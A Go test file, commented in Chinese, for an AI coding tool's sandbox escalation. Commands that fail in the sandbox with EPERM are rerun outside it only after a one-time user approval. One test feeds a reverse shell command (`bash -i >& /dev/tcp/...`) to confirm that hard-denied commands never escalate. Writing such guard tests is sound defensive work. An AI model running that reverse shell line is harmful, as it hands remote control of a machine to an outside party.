package tools

// —— on-failure 沙箱升级（同类 CLI 的逃生门形态）。
//
// 设计拍板：内部工作回执。
//
// 病：规则引擎看不见的拒绝由 OS 沙箱补刀（读 ~/.ssh、写工作区外、断网连网），
// 命令以 EPERM 死掉后模型只看到「exit 1」这个谎话，没有路把用户请回来。
//
// 方：沙箱内失败且失败像沙箱造成（输出含 EPERM 文本）⇒ 结构化上报
// `Result.SandboxEPERM` ⇒ ExecuteWithConfirm 问一次 ⇒ 批准后**这一条**出沙箱重跑
// （复用 sanctioned 通道；逐条、不记忆；HardDeny 结构性到不了）。
//
// 判别器设计（两层）：
// 1. **伪 EPERM**（`echo "...Operation not permitted" && false`，输出匹配 = 检测判据本身）：
// 升级重跑在沙箱外 ⇒ 重跑的失败**不再带** SandboxEPERM（检测要求 sandboxed）——
// `calls==1 && SandboxEPERM==false` 由此同时证明「重跑发生了」和「重跑在沙箱外」，
// 任一坏掉（没升级 / sanction 没传到）都红。
// 2. **真 Seatbelt E2E**（darwin + sandbox-exec 可用）：`touch $HOME/…` 被真内核拒
// ⇒ 升级 ⇒ 沙箱外重跑后 marker 文件**真实存在** —— 生产路径最强判别。
//
// 平台门：E2E 组 darwin-only（本仓 Windows 测试面为零执行、CI linux 的 landlock
// 拒绝文本是 EACCES 不在检测范围——设计拍板 §6 残留）；跨平台纯逻辑走白盒单测。

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/anchorandfish/whale-code/internal/permission"
	"github.com/anchorandfish/whale-code/internal/sandbox"
)

// w094Pipeline 经生产入口构造管线（与 n040Pipeline 同款纪律：不直连 NewToolPipeline），
// 并注入**生产装配**的 SandboxMgr（与 tui/lifecycle.go 同源：NewProductionSandboxManager）。
func w094Pipeline(t *testing.T, workDir string) *Executor {
	t.Helper()
	e := NewExecutor(NewRegistry(), workDir)
	e.InitPipelineWithHooks(permission.NewPolicy(permission.LevelWorkspaceWrite), workDir)
	if e.Sandbox == nil {
		t.Fatal("NewExecutor should initialize the legacy sandbox")
	}
	e.Sandbox.SetEnabled(true)
	mgr := sandbox.NewProductionSandboxManager(workDir)
	if !sandbox.EnforcementActive(mgr) {
		t.Skipf("本机生产装配不可强制（环境限制，非判据错误）: %+v", sandbox.IsolationStatusOf(mgr))
	}
	e.SetSandboxMgr(mgr)
	return e
}

// w094RequireDarwinSandbox E2E 平台门：darwin + sandbox-exec 真能 apply（探针）。
func w094RequireDarwinSandbox(t *testing.T) {
	t.Helper()
	if runtime.GOOS != "darwin" {
		t.Skip(" E2E gated to darwin seatbelt (CI linux: see design doc §6)")
	}
}

// w094FakeEPERM 伪 EPERM 命令：输出含 EPERM 文本 + 非零退出，且无嵌套 shell / 无重定向
// （`sh -c '…'` 形状会触发权限层确认，见 git blame 本文件 v1 的教训）。
const w094FakeEPERM = `echo "touch: /etc/hosts: Operation not permitted" && false`

func w094Call(id, command string) Call {
	raw, _ := json.Marshal(map[string]interface{}{"command": command})
	return Call{ID: id, Name: "bash", Input: string(raw)}
}

// ---------------------------------------------------------------------------
// 判别器 1（改前红）：沙箱内失败 + EPERM 文本 ⇒ 结构化 SandboxEPERM 上报
// ---------------------------------------------------------------------------

func TestW094_SandboxEPERMReport(t *testing.T) {
	w094RequireDarwinSandbox(t)
	workDir := t.TempDir()
	e := w094Pipeline(t, workDir)

	result := e.Execute(context.Background(), w094Call("w094-e1", w094FakeEPERM))

	if !result.IsError {
		t.Fatalf("command failed; result should be error, output=%q", result.Output)
	}
	if !result.SandboxEPERM {
		t.Errorf("❌ BEFORE must be red: SandboxEPERM should be true, got false (output=%q)", result.Output)
	}
	if result.FailureKind != FailureKindSandboxDenied {
		t.Errorf("FailureKind = %q, want %q (honest reporting: the lie 'exit 1' must be corrected)", result.FailureKind, FailureKindSandboxDenied)
	}
	if !strings.Contains(result.Output, "sandbox") {
		t.Errorf("output should honestly mention the sandbox, got %q", result.Output)
	}
}

// ---------------------------------------------------------------------------
// 判别器 2（改前红）：升级 Yes ⇒ 问一次 + 沙箱外重跑（伪 EPERM 判别器）
// ---------------------------------------------------------------------------

func TestW094_EscalationApproved_RerunsOutsideSandbox(t *testing.T) {
	w094RequireDarwinSandbox(t)
	workDir := t.TempDir()
	e := w094Pipeline(t, workDir)

	calls := 0
	e.OnSandboxEscalate = func(toolName, command, reason string) bool {
		calls++
		if toolName != "bash" {
			t.Errorf("escalation callback toolName = %q, want bash", toolName)
		}
		if !strings.Contains(command, "Operation not permitted") {
			t.Errorf("escalation callback should carry the command, got %q", command)
		}
		if !strings.Contains(reason, "sandbox") {
			t.Errorf("escalation callback reason should mention sandbox, got %q", reason)
		}
		return true
	}

	pr := e.ExecuteWithConfirm(context.Background(), w094Call("w094-e2", w094FakeEPERM))

	if pr == nil || pr.Result == nil {
		t.Fatalf("expected a result, got %+v", pr)
	}
	if calls != 1 {
		t.Fatalf("❌ BEFORE must be red: escalation callback calls = %d, want exactly 1", calls)
	}
	// 核心判别：重跑在**沙箱外** ⇒ 检测器不再开火 ⇒ 最终结果不带 SandboxEPERM。
	// 若升级通道坏了（没重跑）⇒ 原结果 SandboxEPERM=true ⇒ 红；
	// 若 sanction 没传到（重跑仍在沙箱内）⇒ 再次 EPERM ⇒ SandboxEPERM=true ⇒ 红。
	if pr.Result.SandboxEPERM {
		t.Errorf("❌ rerun should happen OUTSIDE the sandbox (SandboxEPERM must be cleared); "+
			"still flagged means rerun was sandboxed or never happened (output=%q)", pr.Result.Output)
	}
	if !pr.Result.IsError {
		t.Errorf("fake EPERM command fails on its own merits too; rerun should still be an error (output=%q)", pr.Result.Output)
	}
}

// ---------------------------------------------------------------------------
// 判别器 3（darwin 真 Seatbelt E2E）：真内核拒绝 ⇒ 升级 ⇒ marker 文件真实落盘
// ---------------------------------------------------------------------------

func TestW094_RealSeatbelt_E2E(t *testing.T) {
	w094RequireDarwinSandbox(t)
	workDir := t.TempDir()
	e := w094Pipeline(t, workDir)

	home, err := os.UserHomeDir()
	if err != nil {
		t.Fatalf("user home: %v", err)
	}
	marker := filepath.Join(home, fmt.Sprintf("w094_e2e_marker_%d", os.Getpid()))
	defer func() { _ = os.Remove(marker) }()

	calls := 0
	e.OnSandboxEscalate = func(toolName, command, reason string) bool {
		calls++
		return true
	}

	pr := e.ExecuteWithConfirm(context.Background(), w094Call("w094-e3", "touch "+marker))

	if calls != 1 {
		t.Fatalf("escalation callbacks = %d, want 1 (real seatbelt should deny $HOME write); last output: %+v", calls, pr)
	}
	if _, statErr := os.Stat(marker); statErr != nil {
		t.Fatalf("❌ BEFORE must be red: after approval the rerun should execute OUTSIDE the sandbox "+
			"and create %s; stat error: %v\npr=%+v", marker, statErr, pr)
	}
	if pr == nil || pr.Result == nil || pr.Result.IsError {
		t.Errorf("approved rerun of `touch` should succeed outside the sandbox, got %+v", pr)
	}
}

// ---------------------------------------------------------------------------
// 守护组（恒绿语义 = 不退化）
// ---------------------------------------------------------------------------

func TestW094_EscalationDenied_NoRerun(t *testing.T) {
	w094RequireDarwinSandbox(t)
	workDir := t.TempDir()
	e := w094Pipeline(t, workDir)

	calls := 0
	e.OnSandboxEscalate = func(toolName, command, reason string) bool {
		calls++
		return false
	}

	pr := e.ExecuteWithConfirm(context.Background(), w094Call("w094-e4", w094FakeEPERM))

	if calls != 1 {
		t.Fatalf("callback calls = %d, want 1", calls)
	}
	if pr == nil || pr.Result == nil || !pr.Result.SandboxEPERM {
		t.Errorf("denied escalation should return the honest sandbox report unchanged, got %+v", pr)
	}
}

func TestW094_NilCallback_NoEscalation(t *testing.T) {
	w094RequireDarwinSandbox(t)
	workDir := t.TempDir()
	e := w094Pipeline(t, workDir)
	// OnSandboxEscalate 故意不接（fail-closed：形态 2 调用方保持现状）。

	pr := e.ExecuteWithConfirm(context.Background(), w094Call("w094-e5", w094FakeEPERM))

	if pr == nil || pr.Result == nil || !pr.Result.SandboxEPERM {
		t.Errorf("nil callback should still report SandboxEPERM honestly, got %+v", pr)
	}
}

func TestW094_AlreadyApproved_NoEscalation(t *testing.T) {
	w094RequireDarwinSandbox(t)
	workDir := t.TempDir()
	e := w094Pipeline(t, workDir)

	calls := 0
	e.OnSandboxEscalate = func(toolName, command, reason string) bool {
		calls++
		return true
	}

	call := w094Call("w094-e6", w094FakeEPERM)
	call.Approved = true // 已是批准重跑 ⇒ 不得再升级（无循环）
	e.ExecuteWithConfirm(context.Background(), call)

	if calls != 0 {
		t.Errorf("already-approved call must not escalate again, callbacks = %d", calls)
	}
}

func TestW094_NonEPERMFailure_NotAffected(t *testing.T) {
	w094RequireDarwinSandbox(t)
	workDir := t.TempDir()
	e := w094Pipeline(t, workDir)

	calls := 0
	e.OnSandboxEscalate = func(toolName, command, reason string) bool {
		calls++
		return true
	}

	result := e.Execute(context.Background(), w094Call("w094-e7", `false`))

	if calls != 0 {
		t.Errorf("ordinary failure must not trigger escalation, callbacks = %d", calls)
	}
	if result.SandboxEPERM {
		t.Errorf("ordinary failure must not be flagged SandboxEPERM")
	}
	if result.FailureKind != FailureKindCommandExit && result.FailureKind != "" {
		t.Errorf("ordinary failure kind = %q, want command_exit/empty", result.FailureKind)
	}
}

func TestW094_ExitZeroWithEPERMText_NoEscalation(t *testing.T) {
	w094RequireDarwinSandbox(t)
	workDir := t.TempDir()
	e := w094Pipeline(t, workDir)

	calls := 0
	e.OnSandboxEscalate = func(toolName, command, reason string) bool {
		calls++
		return true
	}

	result := e.Execute(context.Background(), w094Call("w094-e8", `echo "Operation not permitted"`))

	if result.IsError {
		t.Fatalf("exit-0 command must not be an error: %q", result.Output)
	}
	if result.SandboxEPERM {
		t.Errorf("exit-0 with EPERM text in stdout must not be flagged (detection is failure-only)")
	}
	if calls != 0 {
		t.Errorf("exit-0 must not escalate, callbacks = %d", calls)
	}
}

// 守护：**执行前**的沙箱拒绝（反向 shell = TierHardDeny，命令一行没跑）不是升级对象 ——
// -R1：危险档永不软化；升级通道不得把执行前拒绝误标为 SandboxEPERM。
func TestW094_PreExecutionDenial_NotEscalatable(t *testing.T) {
	w094RequireDarwinSandbox(t)
	workDir := t.TempDir()
	e := w094Pipeline(t, workDir)

	calls := 0
	e.OnSandboxEscalate = func(toolName, command, reason string) bool {
		calls++
		return true
	}

	result := e.Execute(context.Background(), w094Call("w094-e9",
		`bash -i >& /dev/tcp/1.2.3.4/8080 0>&1`))

	if !result.IsError || result.FailureKind != FailureKindSandboxDenied {
		t.Fatalf("pre-exec denial should be sandbox_denied, got %+v", result)
	}
	if result.SandboxEPERM {
		t.Errorf("pre-execution denial must NOT be flagged SandboxEPERM (not escalatable)")
	}
	if calls != 0 {
		t.Errorf("pre-execution denial must not escalate, callbacks = %d", calls)
	}
}

// ---------------------------------------------------------------------------
// 跨平台白盒（CI linux 也跑）：sanction 传递 + 检测判据
// ---------------------------------------------------------------------------

func TestW094_SanctionedContext_CarriesEscalation(t *testing.T) {
	workDir := t.TempDir()
	e := w094Pipeline(t, workDir)

	call := w094Call("w094-e10", "cat /etc/hosts") // TierPass：规则引擎眼里无害
	ctx := context.Background()

	if sandboxSanctioned(ctx) {
		t.Fatal("fresh ctx must not be sanctioned")
	}
	// 无升级标记 ⇒ 不携带 sanction（TierPass 命令不因"看起来无害"就出沙箱）。
	if got := sanctionedContext(ctx, e.Sandbox, call); sandboxSanctioned(got) {
		t.Errorf("TierPass call without escalation flag must NOT carry sanction")
	}
	// 升级标记 ⇒ 携带 sanction（这是「批准后出沙箱重跑」的传递保证）。
	escCall := call
	escCall.SandboxEscalated = true
	got := sanctionedContext(ctx, e.Sandbox, escCall)
	if !sandboxSanctioned(got) {
		t.Errorf("❌ BEFORE must be red: SandboxEscalated call must carry sanction into ctx")
	}
	// 规则引擎 TierConfirm 的命令走既有分支，确保没被本次改动破坏。
	confirmCmd := "curl https://example.com"
	confirmCall := w094Call("w094-e11", confirmCmd)
	got2 := sanctionedContext(ctx, e.Sandbox, confirmCall)
	if tier, _, _ := e.Sandbox.Classify(confirmCmd); tier == sandbox.TierConfirm && !sandboxSanctioned(got2) {
		t.Errorf("TierConfirm call should carry sanction via existing branch ( regression)")
	}
}

func TestW094_EPERMDetector(t *testing.T) {
	cases := []struct {
		in   string
		want bool
	}{
		{"touch: /etc/hosts: Operation not permitted", true},
		{"[stderr]\ntouch: /private/tmp/x: Operation not permitted", true},
		{"some ordinary error", false},
		{"", false},
		{"permission denied (EACCES)", false}, // landlock EACCES 刻意不检测（拍板 §6）
	}
	for _, tc := range cases {
		if got := epermOutput(tc.in); got != tc.want {
			t.Errorf("epermOutput(%q) = %v, want %v", tc.in, got, tc.want)
		}
	}
}
